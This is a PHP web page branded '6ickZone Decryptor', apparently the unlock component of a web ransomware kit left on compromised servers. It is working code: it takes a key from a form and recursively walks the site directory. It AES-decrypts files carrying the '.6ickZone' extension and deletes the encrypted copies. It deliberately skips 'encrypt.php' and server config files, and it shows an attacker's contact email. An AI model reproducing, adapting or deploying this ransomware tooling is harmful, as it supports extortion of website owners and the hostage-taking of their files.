<?php
/*©6ickZone - 6ickwhispers@gmail.com*/
@set_time_limit(0); @error_reporting(0);
$k=isset($_POST['decryption_key'])?$_POST['decryption_key']:'';
$e='.6ickZone'; $x=[basename(__FILE__),'encrypt.php','.htaccess','.user.ini'];
$c=0;$o=false;
function d($f,$k,$e){global$c;
if(!($d=@file_get_contents($f))||substr($d,0,9)!=='6ickZone:')return false;
$a=base64_decode(substr($d,9)); if(strlen($a)<16)return false;
$v=substr($a,0,16);$b=substr($a,16);
$r=openssl_decrypt($b,'AES-128-CBC',$k,OPENSSL_RAW_DATA,$v);
if($r===false)return false;
$p=substr($f,0,-strlen($e)); if(file_put_contents($p,$r)===false)return false;
@unlink($f);$c++; return true;}
function s($d,$k,$x,$e){foreach(scandir($d)as$i){
if($i=='.'||$i=='..'||in_array($i,$x))continue;
$p=$d.DIRECTORY_SEPARATOR.$i;
if(is_dir($p))s($p,$k,$x,$e);elseif(is_file($p)&&substr($i,-strlen($e))===$e){d($p,$k,$e);}}}
if(isset($_POST['unlock'])&&!empty($k)){$o=true;s(__DIR__,$k,$x,$e);}
?>
<style>*{box-sizing:border-box}html,body{margin:0;padding:0;height:100%;font-family:monospace;background:url('https://i.imgur.com/lHnsQI3.jpeg')no-repeat center center fixed;background-size:cover;color:#0f0}.container{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;text-align:center;padding:20px}input,button{padding:10px;font-size:16px;margin:10px;border-radius:5px}input{width:300px;border:1px solid #0f0;background:#111;color:#0f0}button{background:#0f0;color:#000;border:none;cursor:pointer}.info{margin-top:20px}.footer{position:absolute;bottom:10px;width:100%;text-align:center;color:#666;font-size:13px}.center-container{display:flex;justify-content:center;align-items:center;min-height:100vh}.form-box{background:rgba(26,26,26,0.87);padding:30px 40px;border-radius:15px;box-shadow:0 0 20px #0f0;max-width:500px;width:100%}</style>
<div class="center-container"><div class="form-box"><h1>6ickZone Decryptor</h1><p><strong>USE UR BRAIN:</strong><br />THIS TOOL IS FOR UNLOCKING FILES ENCRYPTED WITH <code>.6ickZone</code> EXTENSION ONLY.<br />6ickwhispers@gmail.com</p>
<?php if(!$o): ?><form method="post"><input type="text" name="decryption_key" placeholder="Enter decryption key..." required /><br /><button type="submit" name="unlock">UNLOCK FILES NOW</button></form>
<?php else: ?><div class="info"><p><strong>Decryption Complete!</strong></p><p>Total files decrypted: <?=$c?></p><p>Make sure the key was correct if result is 0.</p></div><?php endif; ?></div></div>
